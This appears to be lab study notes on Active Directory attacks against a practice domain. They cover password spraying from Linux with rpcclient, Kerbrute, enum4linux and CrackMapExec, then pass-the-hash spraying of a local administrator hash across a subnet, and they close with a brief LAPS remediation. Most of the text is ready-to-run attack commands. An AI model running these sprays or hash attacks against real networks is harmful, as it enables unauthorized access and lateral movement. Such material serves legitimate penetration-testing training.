This document covers the execution phase of password spraying from a Linux host using multiple tooling options, followed by methods for exploiting local administrator password reuse across subnets.

### Phase 1: Executing Password Sprays from Linux
Once a valid target user list (`valid_users.txt`) and a target password are chosen based on the domain policy, execute the spray using one of the following methods:
#### 1. Using `rpcclient` (Bash One-Liner)
Filter responses for `Authority` to identify valid logins since success output isn't explicitly flagged:

```Bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### 2. Using `Kerbrute`

Need list of usernames first before passing it into Kerbrute. Can use enum4linux
```Shell
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

Leverage Kerberos pre-authentication for fast and stealthy spraying:
```Bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
#### 3. Using `CrackMapExec`
Pass the username list and target password, filtering for successful hits (`+`):
```Bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
- **Validate credentials post-hit:**
    ```Bash
    sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
    ```
    
### Phase 2: Local Administrator Password Reuse & Pass-the-Hash Spraying
When administrative access or an NTLM hash for a local administrator is obtained, this credential can be tested across multiple hosts due to widespread automated deployment reuse (gold images).
#### Pass-the-Hash Subnet Spraying (`CrackMapExec`)
To hunt for identical local admin passwords or hashes across an entire network range while **preventing domain account lockouts**, use the `--local-auth` flag:
```Bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
- **Critical Note:** The `--local-auth` flag restricts authentication attempts locally to each target host rather than the domain controller, eliminating the risk of locking out domain accounts.
#### Remediation for Password Reuse
- Implement **Microsoft LAPS (Local Administrator Password Solution)** to automatically manage, randomize, and rotate unique local administrator passwords across every domain-joined host.